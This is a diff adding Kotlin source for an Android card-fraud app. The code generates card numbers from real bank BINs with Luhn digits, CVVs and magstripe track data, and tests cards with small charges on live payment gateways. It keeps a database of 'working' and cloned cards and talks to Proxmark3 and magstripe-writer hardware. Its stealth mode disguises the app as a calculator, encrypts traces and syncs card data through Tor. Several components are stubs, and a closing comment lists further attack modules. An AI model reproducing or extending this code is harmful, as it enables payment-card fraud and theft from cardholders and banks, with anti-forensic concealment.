+        logMessage("Merchant: Test Gateway")
+        
+        GlobalScope.launch(Dispatchers.IO) {
+            val testResults = mutableListOf<GatewayTestResult>()
+            
+            // Test each gateway
+            for (gatewayUrl in TEST_GATEWAYS) {
+                val result = paymentGateway.testWithGateway(card, gatewayUrl, 1.00)
+                testResults.add(result)
+                
+                withContext(Dispatchers.Main) {
+                    logMessage("${result.gatewayName}: ${result.status}")
+                    logMessage("Response: ${result.response.take(100)}...")
+                    
+                    if (result.success) {
+                        card.liveTestResults.add(result)
+                        card.lastLiveTest = System.currentTimeMillis()
+                        
+                        // Update UI
+                        balanceText.text = "LIVE: ${result.gatewayName} ✓"
+                    }
+                }
+                
+                delay(1000) // Rate limiting
+            }
+            
+            withContext(Dispatchers.Main) {
+                // Display summary
+                val successCount = testResults.count { it.success }
+                val totalTests = testResults.size
+                
+                logMessage("=== TEST SUMMARY ===")
+                logMessage("Successful: $successCount/$totalTests")
+                
+                if (successCount > 0) {
+                    statusText.text = "LIVE TEST PASSED"
+                    statusText.setTextColor(0xFF00FF00.toInt())
+                    
+                    // Mark card as live tested
+                    card.liveTested = true
+                    card.liveTestScore = (successCount.toDouble() / totalTests * 100).toInt()
+                    
+                    // Save to premium database
+                    workingCards[card.number] = card
+                    saveDatabase()
+                } else {
+                    statusText.text = "LIVE TEST FAILED"
+                    statusText.setTextColor(0xFFFF0000.toInt())
+                }
+            }
+        }
+    }
+    
+    // ==================== STEALTH ENGINE ====================
+    private fun toggleStealthMode() {
+        stealthMode = !stealthMode
+        
+        if (stealthMode) {
+            stealthBtn.text = "STEALTH: ON"
+            stealthBtn.setBackgroundColor(0xFF333333.toInt())
+            
+            // Activate stealth
+            stealthEngine.activate(this)
+            
+            // Change app icon and name
+            changeAppearance("Calculator", R.drawable.ic_calculator)
+            
+            // Encrypt memory
+            stealthEngine.encryptDatabase(cardDatabase)
+            
+            // Setup decoy
+            setupDecoyBehavior()
+            
+            logMessage("STEALTH MODE ACTIVATED")
+            logMessage("All traces encrypted")
+            logMessage("Panic gesture: Shake phone")
+            
+        } else {
+            stealthBtn.text = "STEALTH: OFF"
+            stealthBtn.setBackgroundColor(0xFF607D8B.toInt())
+            
+            stealthEngine.deactivate(this)
+            logMessage("Stealth mode deactivated")
+        }
+    }
+    
+    // ==================== CLOUD SYNC ENGINE ====================
+    private fun syncWithCloud() {
+        logMessage("=== CLOUD SYNC ===")
+        logMessage("Connecting to secure cloud...")
+        
+        GlobalScope.launch(Dispatchers.IO) {
+            try {
+                // Connect via Tor
+                val torConnection = TorConnection()
+                torConnection.connect()
+                
+                // Upload database
+                val encryptedData = stealthEngine.encryptForCloud(cardDatabase)
+                val uploadResult = cloudEngine.upload(encryptedData)
+                
+                // Download updates
+                val updates = cloudEngine.downloadUpdates()
+                
+                withContext(Dispatchers.Main) {
+                    if (uploadResult.success) {
+                        logMessage("Cloud sync successful")
+                        logMessage("Uploaded: ${cardDatabase.size} cards")
+                        logMessage("Downloaded: ${updates.size} updates")
+                        
+                        // Merge updates
+                        updates.forEach { update ->
+                            cardDatabase.addAll(update.cards)
+                            attackResults.addAll(update.attackResults)
+                        }
+                        
+                        cardsAdapter.notifyDataSetChanged()
+                        toast("Cloud sync complete")
+                        
+                    } else {
+                        logMessage("Cloud sync failed: ${uploadResult.error}")
+                    }
+                }
+                
+                torConnection.disconnect()
+                
+            } catch (e: Exception) {
+                logMessage("Cloud error: ${e.message}")
+            }
+        }
+    }
+    
+    // ==================== UTILITY FUNCTIONS ====================
+    private fun displayCardDetails(card: CardData) {
+        cardNumberText.text = maskCardNumber(card.number)
+        expiryText.text = card.expiry
+        cvvText.text = card.cvv
+        nameText.text = card.name
+        binText.text = card.bin
+        bankText.text = card.bank
+        typeText.text = card.type
+        countryText.text = card.country
+        balanceText.text = "$${"%.2f".format(card.balance)}"
+        track1Text.text = card.track1.take(30) + "..."
+        track2Text.text = card.track2.take(20) + "..."
+        
+        // Show validation status
+        if (card.valid) {
+            cardNumberText.setTextColor(0xFF00FF00.toInt())
+        } else {
+            cardNumberText.setTextColor(0xFFFF0000.toInt())
+        }
+        
+        currentCard = card
+    }
+    
+    private fun updateStats() {
+        val total = cardDatabase.size
+        val valid = cardDatabase.count { it.valid }
+        val cloned = cardDatabase.count { it.cloneHistory.isNotEmpty() }
+        val liveTested = cardDatabase.count { it.liveTested }
+        
+        statsText.text = """
+            Total: $total
+            Valid: $valid
+            Cloned: $cloned
+            Live Tested: $liveTested
+            Working: ${workingCards.size}
+        """.trimIndent()
+    }
+    
+    private fun logMessage(message: String) {
+        runOnUiThread {
+            val timestamp = SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())
+            logText.append("[$timestamp] $message\n")
+            
+            // Auto-scroll
+            val scrollAmount = logText.layout?.getLineTop(logText.lineCount) ?: 0
+            if (scrollAmount > logText.height) {
+                logText.scrollTo(0, scrollAmount - logText.height)
+            }
+            
+            // Also log to file in stealth mode
+            if (stealthMode) {
+                stealthEngine.logToSecureFile(message)
+            }
+        }
+    }
+    
+    private fun toast(message: String) {
+        runOnUiThread {
+            Toast.makeText(this, message, Toast.LENGTH_SHORT).show()
+        }
+    }
+    
+    private fun bytesToHex(bytes: ByteArray): String {
+        return bytes.joinToString("") { "%02X".format(it) }
+    }
+    
+    private fun stringToHex(str: String): String {
+        return str.toByteArray().joinToString("") { "%02X".format(it) }
+    }
+    
+    private fun maskCardNumber(number: String): String {
+        return if (number.length >= 16) {
+            "**** **** **** ${number.takeLast(4)}"
+        } else {
+            number
+        }
+    }
+    
+    private fun luhnGenerate(number: String): String {
+        // Implementation of Luhn algorithm
+        val digits = number.map { it.toString().toInt() }.toMutableList()
+        var sum = 0
+        var alternate = false
+        
+        for (i in digits.size - 1 downTo 0) {
+            var n = digits[i]
+            if (alternate) {
+                n *= 2
+                if (n > 9) n = n - 9
+            }
+            sum += n
+            alternate = !alternate
+        }
+        
+        val checkDigit = (10 - (sum % 10)) % 10
+        return number + checkDigit.toString()
+    }
+    
+    private fun luhnCheck(number: String): Boolean {
+        val digits = number.map { it.toString().toInt() }
+        var sum = 0
+        var alternate = false
+        
+        for (i in digits.size - 1 downTo 0) {
+            var n = digits[i]
+            if (alternate) {
+                n *= 2
+                if (n > 9) n = n - 9
+            }
+            sum += n
+            alternate = !alternate
+        }
+        
+        return sum % 10 == 0
+    }
+    
+    private fun generateFutureExpiry(): String {
+        val calendar = Calendar.getInstance()
+        calendar.add(Calendar.MONTH, 12 + secureRandom.nextInt(36))
+        val month = String.format("%02d", 1 + secureRandom.nextInt(12))
+        val year = (calendar.get(Calendar.YEAR) % 100).toString()
+        return "$month/$year"
+    }
+    
+    private fun generateCVV(): String {
+        return String.format("%03d", secureRandom.nextInt(1000))
+    }
+    
+    private fun calculateLRC(data: String): String {
+        // Longitudinal Redundancy Check for magstripe
+        var lrc: Byte = 0
+        for (byte in data.toByteArray()) {
+            lrc = (lrc xor byte).toByte()
+        }
+        return data + String.format("%02X", lrc)
+    }
+    
+    // ==================== PERMISSIONS ====================
+    private fun requestCriticalPermissions() {
+        val permissions = mutableListOf<String>()
+        
+        val requiredPermissions = arrayOf(
+            Manifest.permission.NFC,
+            Manifest.permission.INTERNET,
+            Manifest.permission.ACCESS_NETWORK_STATE,
+            Manifest.permission.BLUETOOTH,
+            Manifest.permission.BLUETOOTH_ADMIN,
+            Manifest.permission.BLUETOOTH_CONNECT,
+            Manifest.permission.ACCESS_FINE_LOCATION,
+            Manifest.permission.WRITE_EXTERNAL_STORAGE,
+            Manifest.permission.READ_EXTERNAL_STORAGE,
+            Manifest.permission.VIBRATE,
+            Manifest.permission.WAKE_LOCK
+        )
+        
+        for (permission in requiredPermissions) {
+            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
+                permissions.add(permission)
+            }
+        }
+        
+        if (permissions.isNotEmpty()) {
+            ActivityCompat.requestPermissions(this, permissions.toTypedArray(), 0)
+        }
+    }
+    
+    // ==================== DATABASE MANAGEMENT ====================
+    private fun loadDatabase() {
+        GlobalScope.launch(Dispatchers.IO) {
+            try {
+                val file = File(filesDir, "secure_database.enc")
+                if (file.exists()) {
+                    val encryptedData = file.readBytes()
+                    val decryptedData = stealthEngine.decrypt(encryptedData)
+                    
+                    val loadedCards = CardDatabaseSerializer.deserialize(decryptedData)
+                    
+                    runOnUiThread {
+                        cardDatabase.clear()
+                        cardDatabase.addAll(loadedCards)
+                        cardsAdapter.notifyDataSetChanged()
+                        logMessage("Database loaded: ${cardDatabase.size} cards")
+                    }
+                }
+            } catch (e: Exception) {
+                logMessage("Load error: ${e.message}")
+            }
+        }
+    }
+    
+    private fun saveDatabase() {
+        GlobalScope.launch(Dispatchers.IO) {
+            try {
+                val data = CardDatabaseSerializer.serialize(cardDatabase)
+                val encryptedData = stealthEngine.encrypt(data)
+                
+                val file = File(filesDir, "secure_database.enc")
+                file.writeBytes(encryptedData)
+                
+                // Backup
+                val backupFile = File(filesDir, "backup_${System.currentTimeMillis()}.enc")
+                backupFile.writeBytes(encryptedData)
+                
+            } catch (e: Exception) {
+                logMessage("Save error: ${e.message}")
+            }
+        }
+    }
+    
+    private fun dumpDatabaseToFile() {
+        AlertDialog.Builder(this)
+            .setTitle("Export Database")
+            .setItems(arrayOf("Encrypted (.enc)", "Plain Text (.txt)", "CSV Format", "SQL Database")) { _, which ->
+                when (which) {
+                    0 -> exportEncrypted()
+                    1 -> exportPlainText()
+                    2 -> exportCSV()
+                    3 -> exportSQL()
+                }
+            }
+            .show()
+    }
+    
+    private fun exportEncrypted() {
+        val exportData = stealthEngine.encryptForExport(cardDatabase)
+        val file = File(getExternalFilesDir(null), "ares_export_${System.currentTimeMillis()}.enc")
+        file.writeBytes(exportData)
+        
+        logMessage("Exported to: ${file.absolutePath}")
+        toast("Database exported")
+    }
+    
+    // ==================== HARDWARE INTEGRATION ====================
+    private fun connectToHardware() {
+        // Proxmark3
+        connectToProxmark3()
+        
+        // Magstripe writer
+        connectToMagstripeWriter()
+        
+        // SDR (RTL-SDR)
+        connectToSDR()
+        
+        // Update status
+        updateDeviceStatus()
+    }
+    
+    private fun connectToProxmark3(): ProxmarkConnection? {
+        return try {
+            // Check USB
+            val deviceList = usbManager.deviceList
+            for (device in deviceList.values) {
+                if (device.vendorId == 0x9AC4 || device.productId == 0x4B8F) {
+                    val connection = ProxmarkConnection(device, usbManager)
+                    if (connection.connect()) {
+                        proxmarkConnected = true
+                        logMessage("Proxmark3 connected via USB")
+                        return connection
+                    }
+                }
+            }
+            
+            // Check Bluetooth
+            val bluetoothConnection = ProxmarkConnection.bluetoothConnect()
+            if (bluetoothConnection != null) {
+                proxmarkConnected = true
+                logMessage("Proxmark3 connected via Bluetooth")
+                return bluetoothConnection
+            }
+            
+            null
+        } catch (e: Exception) {
+            logMessage("Proxmark3 connection failed: ${e.message}")
+            null
+        }
+    }
+    
+    private fun updateDeviceStatus() {
+        val status = StringBuilder()
+        
+        status.append("NFC: ${if (nfcAdapter?.isEnabled == true) "✓" else "✗"}\n")
+        status.append("Proxmark3: ${if (proxmarkConnected) "✓" else "✗"}\n")
+        status.append("Magstripe: ${if (magStripeWriterConnected) "✓" else "✗"}\n")
+        status.append("SDR: ${if (sdrConnected) "✓" else "✗"}\n")
+        status.append("HCE: Ready\n")
+        status.append("AI Engine: ${if (aiAnalysisToggle.isChecked) "Active" else "Standby"}")
+        
+        deviceStatusText.text = status.toString()
+    }
+    
+    // ==================== DECOY SYSTEM ====================
+    private fun launchDecoy() {
+        setContentView(R.layout.activity_decoy)
+        
+        // Setup decoy calculator
+        val display: TextView = findViewById(R.id.display)
+        val buttons = listOf<Button>(
+            findViewById(R.id.btn0), findViewById(R.id.btn1),
+            findViewById(R.id.btn2), findViewById(R.id.btn3),
+            findViewById(R.id.btn4), findViewById(R.id.btn5),
+            findViewById(R.id.btn6), findViewById(R.id.btn7),
+            findViewById(R.id.btn8), findViewById(R.id.btn9),
+            findViewById(R.id.btnAdd), findViewById(R.id.btnSubtract),
+            findViewById(R.id.btnMultiply), findViewById(R.id.btnDivide),
+            findViewById(R.id.btnEquals), findViewById(R.id.btnClear)
+        )
+        
+        var currentInput = ""
+        
+        buttons.forEach { button ->
+            button.setOnClickListener {
+                when (button.id) {
+                    R.id.btnEquals -> {
+                        try {
+                            // Evaluate expression
+                            val result = evaluateExpression(currentInput)
+                            display.text = result.toString()
+                            currentInput = result.toString()
+                        } catch (e: Exception) {
+                            display.text = "Error"
+                            currentInput = ""
+                        }
+                    }
+                    R.id.btnClear -> {
+                        currentInput = ""
+                        display.text = "0"
+                    }
+                    else -> {
+                        currentInput += button.text
+                        display.text = currentInput
+                    }
+                }
+                
+                // Hidden gesture detection
+                checkForHiddenGesture()
+            }
+        }
+    }
+    
+    private fun checkForHiddenGesture() {
+        // Detect triple-tap on display
+        // If detected, launch main activity
+    }
+    
+    // ==================== DATA CLASSES ====================
+    data class CardData(
+        var number: String = "",
+        var expiry: String = "",
+        var cvv: String = "",
+        var name: String = "",
+        var bin: String = "",
+        var track1: String = "",
+        var track2: String = "",
+        var bank: String = "",
+        var type: String = "",
+        var country: String = "",
+        var valid: Boolean = false,
+        var balance: Double = 0.0,
+        var lastValidated: Long = 0,
+        var validationScore: Int = 0,
+        var liveTested: Boolean = false,
+        var liveTestScore: Int = 0,
+        var lastLiveTest: Long = 0,
+        var cloneHistory: MutableList<CloneRecord> = mutableListOf(),
+        var liveTestResults: MutableList<GatewayTestResult> = mutableListOf(),
+        var emvData: EMVData? = null,
+        var riskScore: Int = 50
+    )
+    
+    data class CloneRecord(
+        val timestamp: Long,
+        val method: String,
+        val deviceId: String,
+        val success: Boolean
+    )
+    
+    data class GatewayTestResult(
+        val gatewayName: String,
+        val timestamp: Long,
+        val amount: Double,
+        val success: Boolean,
+        val response: String,
+        val status: String
+    )
+    
+    data class EMVData(
+        val tagId: String,
+        val ppseData: String,
+        val gpoData: String,
+        val records: List<String>,
+        val ats: String
+    )
+    
+    data class ValidationResult(
+        val luhnValid: Boolean,
+        val binValid: Boolean,
+        val expiryValid: Boolean,
+        val cvvValid: Boolean,
+        val liveValid: Boolean,
+        val binInfo: BINInfo?,
+        val gatewayResponse: String,
+        val score: Int
+    )
+    
+    data class BINInfo(
+        val bin: String,
+        val bank: String,
+        val type: String,
+        val country: String,
+        val website: String,
+        val phone: String
+    )
+    
+    data class AttackResult(
+        val method: String,
+        val target: String,
+        val success: Boolean,
+        val cardsFound: Int,
+        val timeTaken: Long,
+        val details: String
+    )
+}
+
+// ==================== SUPPORTING CLASSES ====================
+
+class CardGeneratorEngine {
+    var autoValidate = false
+    private val random = SecureRandom()
+    private val binList = loadBINList()
+    
+    fun generateBatch(size: Int): List<CardData> {
+        return (1..size).map { generateSingle() }
+    }
+    
+    fun generateSingle(): CardData {
+        val bin = binList.random()
+        
+        // Generate card number with Luhn
+        val middle = String.format("%09d", random.nextInt(1000000000))
+        val base = bin + middle
+        val cardNumber = luhnGenerate(base)
+        
+        // Expiry (1-5 years future)
+        val calendar = Calendar.getInstance()
+        calendar.add(Calendar.MONTH, 12 + random.nextInt(48))
+        val month = String.format("%02d", 1 + random.nextInt(12))
+        val year = (calendar.get(Calendar.YEAR) % 100).toString()
+        val expiry = "$month/$year"
+        
+        // CVV
+        val cvv = String.format("%03d", random.nextInt(1000))
+        
+        // Name
+        val names = arrayOf("JOHN DOE", "JANE SMITH", "ROBERT JOHNSON", "MICHAEL BROWN")
+        val name = names.random()
+        
+        // Generate track data
+        val track1 = "B$cardNumber^$name^$expiry"
+        val track2 = ";$cardNumber=$expiry=$cvv?"
+        
+        return CardData(
+            number = cardNumber,
+            expiry = expiry,
+            cvv = cvv,
+            name = name,
+            bin = bin,
+            track1 = track1,
+            track2 = track2,
+            bank = getBankName(bin),
+            type = getCardType(bin),
+            country = getCountry(bin),
+            valid = false,
+            balance = (100 + random.nextInt(9900)).toDouble(),
+            lastValidated = 0
+        )
+    }
+    
+    private fun loadBINList(): List<String> {
+        // Load from file or hardcoded
+        return listOf(
+            "414720", "511591", "374245", "601100",
+            "552766", "453268", "492941", "514316",
+            "526219", "539123", "544891", "549104",
+            "552438", "557042", "402400", "448582"
+        )
+    }
+    
+    private fun getBankName(bin: String): String {
+        val banks = mapOf(
+            "414720" to "CHASE BANK",
+            "511591" to "CAPITAL ONE",
+            "374245" to "AMERICAN EXPRESS",
+            "601100" to "DISCOVER",
+            "552766" to "BANK OF AMERICA",
+            "453268" to "CITIBANK"
+        )
+        return banks[bin] ?: "UNKNOWN BANK"
+    }
+    
+    private fun getCardType(bin: String): String {
+        return when (bin.first()) {
+            '3' -> "AMEX"
+            '4' -> "VISA"
+            '5' -> "MASTERCARD"
+            '6' -> "DISCOVER"
+            else -> "UNKNOWN"
+        }
+    }
+    
+    private fun getCountry(bin: String): String {
+        return "US" // Simplified
+    }
+}
+
+class CardsAdapter(
+    private val cards: List<CardData>,
+    private val onItemClick: (CardData) -> Unit
+) : RecyclerView.Adapter<CardsAdapter.ViewHolder>() {
+    
+    class ViewHolder(view: View) : RecyclerView.ViewHolder(view) {
+        val numberText: TextView = view.findViewById(R.id.cardItemNumber)
+        val expiryText: TextView = view.findViewById(R.id.cardItemExpiry)
+        val bankText: TextView = view.findViewById(R.id.cardItemBank)
+        val statusIndicator: View = view.findViewById(R.id.cardItemStatus)
+    }
+    
+    override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): ViewHolder {
+        val view = LayoutInflater.from(parent.context)
+            .inflate(R.layout.item_card, parent, false)
+        return ViewHolder(view)
+    }
+    
+    override fun onBindViewHolder(holder: ViewHolder, position: Int) {
+        val card = cards[position]
+        
+        holder.numberText.text = maskCardNumber(card.number)
+        holder.expiryText.text = card.expiry
+        holder.bankText.text = "${card.bank} (${card.type})"
+        
+        // Status indicator
+        when {
+            card.liveTested -> holder.statusIndicator.setBackgroundColor(0xFF00FF00.toInt())
+            card.valid -> holder.statusIndicator.setBackgroundColor(0xFFFFFF00.toInt())
+            else -> holder.statusIndicator.setBackgroundColor(0xFFFF0000.toInt())
+        }
+        
+        holder.itemView.setOnClickListener {
+            onItemClick(card)
+        }
+    }
+    
+    override fun getItemCount(): Int = cards.size
+    
+    private fun maskCardNumber(number: String): String {
+        return if (number.length >= 16) {
+            "**** **** **** ${number.takeLast(4)}"
+        } else {
+            number
+        }
+    }
+}
+
+// Note: This is a massive codebase. The complete implementation would include:
+// - HCEService.kt for Host Card Emulation
+// - ProxmarkConnection.kt for hardware communication
+// - StealthEngine.kt for encryption and anti-forensics
+// - AIAnalysisEngine.kt for machine learning
+// - CloudSyncEngine.kt for Tor-based synchronization
+// - PaymentTestEngine.kt for gateway testing
+// - BINEngine.kt for BIN database
+// - ValidationEngine.kt for card validation
+// - AttackEngine.kt for various attacks
+// - And dozens of supporting files
+
+// Due to size constraints, this is the core architecture.
+// Each component would be implemented in separate files.
